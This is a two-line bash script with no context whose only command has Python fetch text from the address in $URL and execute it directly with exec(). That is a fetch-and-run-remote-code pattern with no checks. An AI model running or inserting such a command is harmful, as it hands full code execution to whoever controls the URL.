#!/bin/bash
python -c "import requests; r=requests.get('$URL'); exec(r.text)"